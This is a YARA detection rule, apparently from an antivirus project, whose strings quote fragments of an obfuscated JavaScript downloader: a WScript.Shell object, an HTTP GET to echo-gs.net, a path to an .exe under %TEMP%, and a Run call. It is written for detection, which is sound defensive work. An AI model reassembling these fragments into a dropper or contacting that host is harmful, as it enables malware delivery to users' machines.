rule sig_20160401_580ce6dadd198bc5c9428788db40fb6c {
  meta:
    description = "datamaliciousorder - file 20160401_580ce6dadd198bc5c9428788db40fb6c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4e801551af3546460f64ffbdcc41e1f74774e8f888085daa6c363fa133e2d90e"

  strings:
    $s1  = "function HlfDsc(NfTuf, LsEkm){QtKrk = QtKrk * 1; return NfTuf - LsEkm;};" fullword ascii
    $s2  = "var YrDq = function LfzYo() {return WScript[ZaePgz](\"WScript\"+\".Shell\");}(), GuYud = 11;" fullword ascii
    $s3  = "if (DttUi[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "DttUi[CaOcm](\"G\" + \"ET\", \"http://echo-gs.net/h6dskl\", false);" fullword ascii
    $s5  = "function EkPgd(){return EqDci + \"\";};" fullword ascii
    $s6  = "function MttAq() {return YrDq[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"pEn0SdgKz1.ex\" + \"e\";};" fullword ascii
    $s7  = "function VyRn() {return ((OwJv == true) && (OwJv == NpbAf)) ? 1 : QtKrk;};" fullword ascii
    $s8  = "function IyrQsd(){return ZaePgz;};" fullword ascii
    $s9  = "NpbAf = true; " fullword ascii
    $s10 = "var JoNk = new this[\"Date\"]();" fullword ascii
    $s11 = "return HlfDsc(WonBtz, DtmKr);" fullword ascii
    $s12 = "var OwJv = false;" fullword ascii
    $s13 = "function BtyMv(UpuZv){YrDq[\"R\"+\"un\"](UpuZv, QtKrk, QtKrk);};" fullword ascii
    $s14 = "OwJv = true; " fullword ascii
    $s15 = "function LbSm(TwgRqk) {var TnfDhc = (1, 2, 3, 4, 5, TwgRqk); return TnfDhc;};" fullword ascii
    $s16 = "}while (VgOj);" fullword ascii
    $s17 = "function BvlKqd(){return 23;};" fullword ascii
    $s18 = "function UrUzg()" fullword ascii
    $s19 = "var NpbAf = false;" fullword ascii
    $s20 = "var YwVtt = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}